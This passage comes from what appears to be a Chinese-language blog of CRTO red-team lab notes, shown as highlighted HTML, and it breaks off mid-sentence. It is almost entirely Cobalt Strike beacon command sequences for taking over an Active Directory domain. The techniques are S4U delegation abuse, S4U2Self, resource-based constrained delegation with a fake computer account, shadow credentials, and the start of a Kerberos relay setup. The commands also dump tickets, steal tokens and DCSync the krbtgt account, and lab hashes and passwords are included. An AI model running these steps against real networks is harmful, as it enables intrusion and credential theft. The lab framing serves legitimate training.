tkt)</span><br><span class="hljs-comment"># /impersonateuser - Impersonating Domain Admin , So check the domain admins and use that. (in lab - nlamb, Administrator)</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> C:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> <span class="hljs-literal">-Domain</span> dev.cyberbotic.io <span class="hljs-literal">-Recurse</span><br>  <br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:CIFS/dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io /user:sql<span class="hljs-literal">-2</span><span class="hljs-variable">$</span> /nowrap /ticket:doIFLD[<span class="hljs-type">...snip...</span>]MuSU8=<br>  <br><span class="hljs-comment"># 3 (b). OR, Access other alternate Service not stated in Delegation attribute (ldap, http, host, etc...)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:CIFS/dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io /altservice:LDAP /nowrap /user:sql<span class="hljs-literal">-2</span><span class="hljs-variable">$</span> /ticket:doIFpD[<span class="hljs-type">...</span>]MuSU8=<br>  <br><span class="hljs-comment"># STEP 2 &amp; 3 in one command using Credentials (Getting TGT and from TGT requesting TGS for Alternative Service)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:SQL<span class="hljs-literal">-2</span><span class="hljs-variable">$</span> /rc4:<span class="hljs-number">49</span>d47d3af2329a410e6510a7ccd535c3 /impersonateuser:nlamb /msdsspn:CIFS/dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io /altservice:LDAP /domain:dev.cyberbotic.io /dc:dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io /nowrap<br>  <br><span class="hljs-comment"># 4. Inject the TGS from previous step (In attacker machine or Initial Machine)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[<span class="hljs-type">...</span>]ljLmlv<br>  <br><span class="hljs-comment"># 5. Access the services </span><br>beacon&gt; steal_token <span class="hljs-number">5540</span><br>beacon&gt; <span class="hljs-built_in">ls</span> \\dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br>beacon&gt; dcsync dev.cyberbotic.io DEV\krbtgt<br>  <br><span class="hljs-comment"># Note: Directory Listing \\dc-2.dev.cyberbotic.io\c$ worked when impersonating &#x27;nlamb&#x27; Domain Admin , But not worked with &#x27;Administrator&#x27; Domain Admin in the CRTO Lab Environment.</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>S4U2自我虐待</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># S4U2Self Abuse can be Used to get TGS from TGT of a Machine Account.</span><br><span class="hljs-comment"># NOTE: A machine account TGT ticket if injected will not work probably, So we have to  abuse S4U2SELF to obtain TGS and get access as Local Admin to that machine.</span><br><span class="hljs-comment"># To Generate TGS from TGT or (TGT, RC4 or AES hash of machine account)</span><br>  <br><span class="hljs-comment"># Get the TGT</span><br><span class="hljs-comment"># Using Credentials or Dump it from machine or use PrintSpool attack (force DC to authenticate with WEB machine with unconstrained Delegation Enabled)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /rc4:c04d18e6ff38ae05ed3747274c82b07e /domain:dev.cyberbotic.io /nowrap<br>  <br>beacon&gt; mimikatz !sekurlsa::tickets<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<span class="hljs-number">0</span>x14794e /nowrap<br>  <br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:<span class="hljs-number">10</span> /nowrap<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io web.dev.cyberbotic.io<br>  <br><span class="hljs-comment"># Inject the TGT into a sacrificial Process and then try to access the machine share. You will get the error.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /ticket:&lt;TGT<span class="hljs-literal">-TICKET</span>&gt;<br>  <br>beacon&gt; steal_token <span class="hljs-number">7656</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist<br>beacon&gt; <span class="hljs-built_in">ls</span> \\dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br>  <br><span class="hljs-comment"># Now Perform the S4U2Self Abuse to get the TGS from the injected TGT in the sacrificial process and use rubeus /ptt to directly pass the ticket to the sacrificial process. (Run it within Sacrificial Process)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:dc<span class="hljs-literal">-2</span><span class="hljs-variable">$</span> /impersonateuser:Administrator /altservice:cifs/dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io /self /nowrap /ptt /ticket:&lt;TGT<span class="hljs-literal">-TICKET</span>&gt;<br>beacon&gt; run klist<br>beacon&gt; <span class="hljs-built_in">ls</span> \\dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>RBCD</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Resource-Based Constrained Delegation (Systems having writable msDS-AllowedToActOnBehalfOfOtherIdentity)</span><br><span class="hljs-comment"># RBCD can be configured to both Domain Machines objects and Domain User Objects, So enumerate both.</span><br>  <br><span class="hljs-comment"># CASE-1 : Have Local Admin Access to any Domain Joined Machine.</span><br>  <br><span class="hljs-comment">#1. Identify the Computer Objects which has AllowedToActOnBehalfOfOtherIdentity attribute defined</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))&quot;</span> <span class="hljs-literal">--attributes</span> dnshostname,samaccountname,msDS<span class="hljs-literal">-AllowedToActOnBehalfOfOtherIdentity</span> <span class="hljs-literal">--json</span><br>  <br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(objectCategory=user)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))&quot;</span> <span class="hljs-literal">--attributes</span> dnshostname,samaccountname,msDS<span class="hljs-literal">-AllowedToActOnBehalfOfOtherIdentity</span> <span class="hljs-literal">--json</span><br>  <br><span class="hljs-comment">#2. OR, Identify the Domain Computer where we have WriteProperty, GenericAll, GenericWrite or WriteDacl and can write this atribute with custom value.</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> c:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainSid</span> <span class="hljs-literal">-Domain</span> dev.cyberbotic.io<br>  <br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> | <span class="hljs-built_in">Get-DomainObjectAcl</span> <span class="hljs-literal">-ResolveGUIDs</span> | ? &#123; <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;WriteProperty|GenericWrite|GenericAll|WriteDacl&quot;</span>&#125;<br>  <br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> | <span class="hljs-built_in">Get-DomainObjectAcl</span> <span class="hljs-literal">-ResolveGUIDs</span> | ? &#123; <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;WriteProperty|GenericWrite|GenericAll|WriteDacl&quot;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;S-1-5-21-569305411-121244042-2357301523-[\d]&#123;4,10&#125;&quot;</span> &#125;<br>  <br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainUser</span> | <span class="hljs-built_in">Get-DomainObjectAcl</span> <span class="hljs-literal">-ResolveGUIDs</span> | ? &#123; <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;WriteProperty|GenericWrite|GenericAll|WriteDacl&quot;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;S-1-5-21-569305411-121244042-2357301523-[\d]&#123;4,10&#125;&quot;</span> &#125;<br>  <br>beacon&gt; powerpick <span class="hljs-built_in">ConvertFrom-SID</span> S<span class="hljs-literal">-1-5-21-569305411-121244042-2357301523-1107</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Developers&quot;</span> <span class="hljs-literal">-Domain</span> dev.cyberbotic.io <span class="hljs-literal">-Recurse</span><br>  <br><span class="hljs-comment">#3. Set the delegation attribute to a Computer Account where we have local admin access by modifying the attribute of target system</span><br><span class="hljs-comment"># If we do not have Local Admin Access to any computer and only have User access then we can create Computer Object and Use it to abuse RBCD. Check Case-2.</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Identity</span> wkstn<span class="hljs-literal">-2</span> <span class="hljs-literal">-Properties</span> objectSid<br>beacon&gt; powerpick <span class="hljs-variable">$rsd</span> = <span class="hljs-built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)&quot;</span>; <span class="hljs-variable">$rsdb</span> = <span class="hljs-built_in">New-Object</span> byte[] (<span class="hljs-variable">$rsd</span>.BinaryLength); <span class="hljs-variable">$rsd</span>.GetBinaryForm(<span class="hljs-variable">$rsdb</span>, <span class="hljs-number">0</span>); <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;dc-2&quot;</span> | <span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Set</span> <span class="hljs-selector-tag">@</span>&#123;<span class="hljs-string">&#x27;msDS-AllowedToActOnBehalfOfOtherIdentity&#x27;</span> = <span class="hljs-variable">$rsdb</span>&#125; <span class="hljs-literal">-Verbose</span><br>  <br><span class="hljs-comment">#4. Verify the updated attribute</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;dc-2&quot;</span> <span class="hljs-literal">-Properties</span> msDS<span class="hljs-literal">-AllowedToActOnBehalfOfOtherIdentity</span><br>  <br><span class="hljs-comment">#5. Get the TGT of our computer</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<span class="hljs-number">0</span>x3e4 /service:krbtgt /nowrap<br>  <br><span class="hljs-comment">#6. Use S4U technique to get TGS for target computer using our TGT</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN<span class="hljs-literal">-2</span><span class="hljs-variable">$</span> /impersonateuser:nlamb /msdsspn:cifs/dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io /ticket:doIFuD[<span class="hljs-type">...</span>]<span class="hljs-number">5</span>JTw== /nowrap<br>  <br><span class="hljs-comment">#7. Access the services</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[<span class="hljs-type">...</span>]MuaW8=<br>  <br>beacon&gt; steal_token <span class="hljs-number">4092</span><br>beacon&gt; <span class="hljs-built_in">ls</span> \\dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br>  <br><span class="hljs-comment">#8. Remove the delegation rights</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Identity</span> dc<span class="hljs-literal">-2</span> | <span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Clear</span> msDS<span class="hljs-literal">-AllowedToActOnBehalfOfOtherIdentity</span><br>  <br><span class="hljs-comment"># CASE-2 : Have Access to a Domain User but not Local Admin on Domain Joined Machine</span><br><span class="hljs-comment"># Create Fake computer Account for RBCD Attack</span><br>  <br><span class="hljs-comment">#1. Check if we have permission to create computer account (default allowed)</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> c:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainObject</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;DC=dev,DC=cyberbotic,DC=io&quot;</span> <span class="hljs-literal">-Properties</span> ms<span class="hljs-literal">-DS-MachineAccountQuota</span><br>  <br><span class="hljs-comment">#2. Create a fake computer with random password and then generate password hash using Rubeus</span><br><span class="hljs-comment"># If You wants to create a new computer object for a different Forest using StandIn Tool, Then Read this blog by Rasta - https://rastamouse.me/getdomain-vs-getcomputerdomain-vs-getcurrentdomain/</span><br><span class="hljs-comment"># Note: StandIn code needs to be modified if you wants to create a Computer in another Domain using --Domain parameter. (https://github.com/FuzzySecurity/StandIn/pull/17)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe <span class="hljs-literal">--computer</span> EvilComputer <span class="hljs-literal">--make</span> <span class="hljs-literal">--Domain</span> dev.cyberbotic.io <br>  <br><span class="hljs-built_in">PS</span>&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer<span class="hljs-variable">$</span> /domain:dev.cyberbotic.io<br>  <br><span class="hljs-comment">#3. Use the Hash to get TGT for our fake computer, and rest of the steps remains same, Follow case-1</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer<span class="hljs-variable">$</span> /aes256:<span class="hljs-number">7</span>A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap<br></code></pre></td></tr></table></figure>
</li>
<li><p>影子凭证</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Shadow Credentials</span><br>  <br><span class="hljs-comment">#1. Enumerate the Permissions GenericWrite/GenericAll to modify the attribute msDS-KeyCredentialLink for User or Computer Object.</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> C:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Find-InterestingDomainAcl</span> <span class="hljs-literal">-ResolveGUIDs</span> | ?&#123;<span class="hljs-variable">$_</span>.IdentityReferenceName <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;Domain Users&quot;</span>&#125;<br>  <br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainSid</span> <span class="hljs-literal">-Domain</span> dev.cyberbotic.io<br>  <br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> | <span class="hljs-built_in">Get-DomainObjectAcl</span> <span class="hljs-literal">-ResolveGUIDs</span> | ? &#123; <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;WriteProperty|GenericWrite|GenericAll|WriteDacl&quot;</span>&#125;<br>  <br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> | <span class="hljs-built_in">Get-DomainObjectAcl</span> <span class="hljs-literal">-ResolveGUIDs</span> | ? &#123; <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;WriteProperty|GenericWrite|GenericAll|WriteDacl&quot;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;S-1-5-21-569305411-121244042-2357301523-[\d]&#123;4,10&#125;&quot;</span> &#125;<br>  <br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainUser</span> | <span class="hljs-built_in">Get-DomainObjectAcl</span> <span class="hljs-literal">-ResolveGUIDs</span> | ? &#123; <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;WriteProperty|GenericWrite|GenericAll|WriteDacl&quot;</span>&#125;<br>  <br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainUser</span> | <span class="hljs-built_in">Get-DomainObjectAcl</span> <span class="hljs-literal">-ResolveGUIDs</span> | ? &#123; <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;WriteProperty|GenericWrite|GenericAll|WriteDacl&quot;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;S-1-5-21-569305411-121244042-2357301523-[\d]&#123;4,10&#125;&quot;</span> &#125;<br>  <br>beacon&gt; powerpick <span class="hljs-built_in">ConvertFrom-SID</span> S<span class="hljs-literal">-1-5-21-569305411-121244042-2357301523-1107</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Developers&quot;</span> <span class="hljs-literal">-Domain</span> dev.cyberbotic.io <span class="hljs-literal">-Recurse</span><br>  <br><span class="hljs-comment">#2-a. List any keys that might already be present for a target - this is important for when we want to clean up later. (Add $ for computer objects in /target)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc<span class="hljs-literal">-2</span><span class="hljs-variable">$</span><br>  <br><span class="hljs-comment">#2-b. Enumerate for Users or Computers which might already be configured for Using Shadow Credentials</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(objectCategory=computer)(msDS-KeyCredentialLink=*))&quot;</span> <span class="hljs-literal">--attributes</span> dnshostname,samaccountname,msDS<span class="hljs-literal">-AllowedToActOnBehalfOfOtherIdentity</span> <span class="hljs-literal">--json</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(objectCategory=user)(msDS-KeyCredentialLink=*))&quot;</span> <span class="hljs-literal">--attributes</span> dnshostname,samaccountname,msDS<span class="hljs-literal">-AllowedToActOnBehalfOfOtherIdentity</span> <span class="hljs-literal">--json</span><br>  <br><span class="hljs-comment">#3. Then, Add a new key pair to the target. (Note the DeviceID GUID added. So we can remove later on.)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe add /target:dc<span class="hljs-literal">-2</span><span class="hljs-variable">$</span><br>  <br><span class="hljs-comment">#4. Check if Shadow Credential is added.</span><br><span class="hljs-comment"># Using Whisker</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc<span class="hljs-literal">-2</span><span class="hljs-variable">$</span><br><span class="hljs-comment"># Using PowerView</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-Identity</span> supportXuser<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Identity</span> dc<span class="hljs-literal">-2</span><br>  <br><span class="hljs-comment">#5. And now, we can ask for a TGT leveraging the certificate and using the Rubeus command that Whisker provides.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dc<span class="hljs-literal">-2</span><span class="hljs-variable">$</span> /certificate:MIIJuA[<span class="hljs-type">...snip...</span>]ICB9A= /password:<span class="hljs-string">&quot;y52EhYqlfgnYPuRb&quot;</span> /nowrap<br>  <br><span class="hljs-comment">#6-a. For machine account TGT , we can perform S4U2Self Abuse and get a TGS</span><br><span class="hljs-comment"># Generate TGS from TGT</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io /user:dc<span class="hljs-literal">-2</span><span class="hljs-variable">$</span> /nowrap /ticket:doIFuj[<span class="hljs-type">...</span>]lDLklP<br><span class="hljs-comment"># Inject TGS in a sacrificial process</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[<span class="hljs-type">...</span>]MuaW8=<br>beacon&gt; steal_token <span class="hljs-number">2664</span><br>beacon&gt; <span class="hljs-built_in">ls</span> \\dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br>  <br><span class="hljs-comment">#6-b. For a User Account TGT, We can just inject it by creating a sacrificial Process.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[<span class="hljs-type">...</span>]MuaW8=<br>  <br>beacon&gt; steal_token <span class="hljs-number">2664</span><br>beacon&gt; <span class="hljs-built_in">ls</span> \\dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br>  <br><span class="hljs-comment">#7. Now we can clean Up , Whisker&#x27;s clear command will remove any and all keys from msDS-KeyCredentialLink.</span><br><span class="hljs-comment">#List all the entries</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc<span class="hljs-literal">-2</span><span class="hljs-variable">$</span><br><span class="hljs-comment">#Remove specific entries</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe remove /target:dc<span class="hljs-literal">-2</span><span class="hljs-variable">$</span> /deviceid:<span class="hljs-number">58</span>d0ccec<span class="hljs-literal">-1f8c-4c7a-8f7e-eb77bc9be403</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>Kerberos 中继攻击</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Kerberos Relay Attack (To Get Local Privilege Escalation from User to System)</span><br>  <br><span class="hljs-comment"># 1- Configuring Cobalt Strike for Kerberos Relay Attack</span><br>  <br><span class="hljs-comment"># 1.1 - Krbrelay uses BouncyCastle Crypto package , Which is quite large , its size is larger than the default task size allowed for beacon. Trying to run it with `execute-assembly` will throw an error.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe<br>[-] Task size of <span class="hljs-number">1727291</span> bytes is over the max task size limit of <span class="hljs-number">1048576</span> bytes.<br>  <br><span class="hljs-comment"># 1.2 - To fix it we have to modify the Malleable C2 profile and double the task size tasks_max_size. Add below line 